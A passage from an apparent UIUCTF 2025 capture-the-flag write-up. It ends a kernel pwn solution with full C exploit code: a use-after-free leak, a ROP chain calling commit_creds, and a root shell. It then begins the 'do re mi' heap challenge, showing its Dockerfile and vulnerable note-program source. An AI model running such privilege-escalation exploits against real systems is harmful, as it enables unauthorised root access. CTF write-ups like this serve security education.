</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Opened device</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">kfree</span><span class="p">()</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">driver_fd</span><span class="p">,</span> <span class="n">FREE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">kread</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ioctl</span><span class="p">(</span><span class="n">driver_fd</span><span class="p">,</span> <span class="n">USE_READ</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">kalloc</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Allocating kernel buffer</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">val</span> <span class="o">=</span> <span class="nf">ioctl</span><span class="p">(</span><span class="n">driver_fd</span><span class="p">,</span> <span class="n">ALLOC</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;val = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to allocate memory : 0x%08x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">set_pt_regs</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, %[pop_rdi];&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r14, %[init_cred];&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r13, %[ret_18];&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r12, %[ret];&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r10, %[commit_creds];&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r9,  %[fork];</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r8,  %[msleep];</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="o">:</span>  <span class="p">[</span><span class="n">pop_rdi</span><span class="p">]</span> <span class="s">&#34;r&#34;</span> <span class="p">(</span><span class="n">POP_RDI</span><span class="p">),</span> <span class="p">[</span><span class="n">init_cred</span><span class="p">]</span> <span class="s">&#34;r&#34;</span> <span class="p">(</span><span class="n">INIT_CRED</span><span class="p">),</span> <span class="p">[</span><span class="n">ret_18</span><span class="p">]</span> <span class="s">&#34;r&#34;</span> <span class="p">(</span><span class="n">RET_18h</span><span class="p">),</span> <span class="p">[</span><span class="n">ret</span><span class="p">]</span> <span class="s">&#34;r&#34;</span> <span class="p">(</span><span class="n">RET</span><span class="p">),</span> <span class="p">[</span><span class="n">commit_creds</span><span class="p">]</span> <span class="s">&#34;r&#34;</span> <span class="p">(</span><span class="n">COMMIT_CREDS</span><span class="p">),</span> <span class="p">[</span><span class="n">fork</span><span class="p">]</span> <span class="s">&#34;r&#34;</span> <span class="p">(</span><span class="n">SYS_FORK</span><span class="p">),</span> <span class="p">[</span><span class="n">msleep</span><span class="p">]</span> <span class="s">&#34;r&#34;</span> <span class="p">(</span><span class="n">MSLEEP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">driver_fd</span> <span class="o">=</span> <span class="nf">open_dev</span><span class="p">(</span><span class="s">&#34;/dev/vuln&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">kalloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">kfree</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/self/stat&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">kread</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">start_ptr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">kbase</span> <span class="o">=</span> <span class="n">start_ptr</span> <span class="o">-</span> <span class="mh">0x2ba4b0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Leaked start pointer: %#lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">start_ptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Kernel base: %#lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] commit_creds: %#lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">COMMIT_CREDS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] init_cred: %#lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">INIT_CRED</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] fork: %#lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">SYS_FORK</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] msleep: %#lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">MSLEEP</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">payload</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">RET_1E0h</span><span class="p">,</span> <span class="c1">// start()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="mi">1</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">            <span class="mi">2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">POP_RDI</span><span class="p">,</span> <span class="c1">// stop()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">driver_fd</span><span class="p">,</span> <span class="n">USE_WRITE</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">set_pt_regs</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rdx, 0x20;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rsi, rsp;&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="s">&#34;mov edi, %[fd];&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="s">&#34;xor rax, rax;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;syscall;&#34;</span>          <span class="c1">// read syscall on the seq fd 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="p">[</span><span class="n">fd</span><span class="p">]</span> <span class="s">&#34;r&#34;</span> <span class="p">(</span><span class="n">fd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="nf">get_shell</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>When we run the exploit, we are able to open the flag file as the root user.
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/exploit.png"
        data-srcset="/posts/uiuctf_2025/images/exploit.png, /posts/uiuctf_2025/images/exploit.png 1.5x, /posts/uiuctf_2025/images/exploit.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/exploit.png"
        title="img" width="769" height="582" /></p>
<h1 id="do-re-mi">do re mi</h1>
<table>
  <thead>
      <tr>
          <th></th>
          <th></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>CTF</strong></td>
          <td><a href="https://2025.uiuc.tf/" target="_blank" rel="noopener noreffer ">UIUCTF</a> <a href="https://ctftime.org/event/2640" target="_blank" rel="noopener noreffer ">(CTFtime)</a></td>
      </tr>
      <tr>
          <td><strong>Author</strong></td>
          <td>Surg</td>
      </tr>
      <tr>
          <td><strong>Category</strong></td>
          <td>Pwn</td>
      </tr>
      <tr>
          <td><strong>Solves</strong></td>
          <td>44</td>
      </tr>
  </tbody>
</table>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/doremi.png"
        data-srcset="/posts/uiuctf_2025/images/doremi.png, /posts/uiuctf_2025/images/doremi.png 1.5x, /posts/uiuctf_2025/images/doremi.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/doremi.png"
        title="img" width="437" height="281" /></p>
<h2 id="challenge-analysis-1">Challenge analysis</h2>
<p>After downloading the handout, we can see a few files.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/doremihandout.png"
        data-srcset="/posts/uiuctf_2025/images/doremihandout.png, /posts/uiuctf_2025/images/doremihandout.png 1.5x, /posts/uiuctf_2025/images/doremihandout.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/doremihandout.png"
        title="img" width="798" height="230" /></p>
<p>One of the files is a library called <code>libmimalloc.so.2.2</code>. <a href="https://github.com/microsoft/mimalloc" target="_blank" rel="noopener noreffer ">mimalloc</a>  is a general-purpose memory allocator developed by Microsoft. It is open source.</p>
<p>Let’s take a look at the Dockerfile:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-Dockerfile">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Dockerfile" data-lang="Dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> alpine AS build</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> apk add build-base cmake git<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> git clone https://github.com/microsoft/mimalloc.git /mimalloc -b v2.2.4 --depth<span class="o">=</span><span class="m">1</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> mkdir -p /mimalloc/build<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nb">cd</span> /mimalloc/build <span class="o">&amp;&amp;</span> cmake -DCMAKE_BUILD_TYPE<span class="o">=</span>Debug .. <span class="o">&amp;&amp;</span> make<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> chal.c /chal.c<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> gcc /chal.c -o /chal<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">FROM</span><span class="s"> alpine AS chroot</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> apk add bash<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">FROM</span><span class="s"> gcr.io/kctf-docker/challenge@sha256:9f15314c26bd681a043557c9f136e7823414e9e662c08dde54d14a6bfd0b619f</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> --from<span class="o">=</span>chroot / /chroot<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> --from<span class="o">=</span>build /mimalloc/build/libmimalloc.so.2.2 /chal /chroot/home/user/<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> flag /chroot/home/user/<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> nsjail.cfg /home/user/<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">CMD</span> kctf_setup <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    kctf_drop_privs <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    socat TCP-LISTEN:1337,reuseaddr,fork <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>        EXEC:<span class="s1">&#39;kctf_pow nsjail --config /home/user/nsjail.cfg --cwd /home/user -- /usr/bin/env LD_PRELOAD=/home/user/libmimalloc.so.2.2 /home/user/chal&#39;</span></span></span></code></pre></div></div>
<p>We can see that the challenge uses mimalloc version 2.2.4. It also copies a file named nsjail.cfg, which isn&rsquo;t included in the handout. However, we can find it from another CTF challenge or public repository.</p>
<p>Fortunately, the source code of the challenge is included, so we can start analyzing it directly.</p>
<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">create</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">update</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">look</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define NOTE_COUNT 16
</span></span></span><span class="line"><span class="cl"><span class="cp">#define NOTE_SIZE  128
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span> <span class="n">notes</span> <span class="p">[</span><span class="n">NOTE_COUNT</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define INTRO &#34;\
</span></span></span><span class="line"><span class="cl"><span class="cp">###################################\n\
</span></span></span><span class="line"><span class="cl"><span class="cp"># Yet Another Heap Note Challenge #\n\
</span></span></span><span class="line"><span class="cl"><span class="cp">###################################\n\
</span></span></span><span class="line"><span class="cl"><span class="cp">    What Would You Like to Do:     \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        1. Create a Note           \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        2. Delete a Note           \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        3. Read a Note             \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        4. Update a Note           \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        5. Exit                    \n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMT &#34;YAHNC&gt; &#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">INTRO</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="n">PMT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34; %u&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">option</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid Input.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">&gt;=</span> <span class="mi">6</span> <span class="o">||</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid Range.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">switch</span><span class="p">(</span><span class="n">option</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> 
</span></span><span class="line"><span class="cl">                <span class="nf">create</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span> 
</span></span><span class="line"><span class="cl">                <span class="nf">delete</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">look</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">update</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">get_index</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Position? (0-15): &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34; %u&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">number</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid Input.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">number</span> <span class="o">&gt;=</span> <span class="mi">16</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid Range.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">number</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">create</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">notes</span><span class="p">[</span><span class="n">number</span><span class="p">]</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">look</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="n">notes</span><span class="p">[</span><span class="n">number</span><span class="p">],</span> <span class="n">NOTE_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">   <span class="nf">free</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">number</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">   <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">update</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Content? (127 max): &#34;</span><span class="p">);</span>
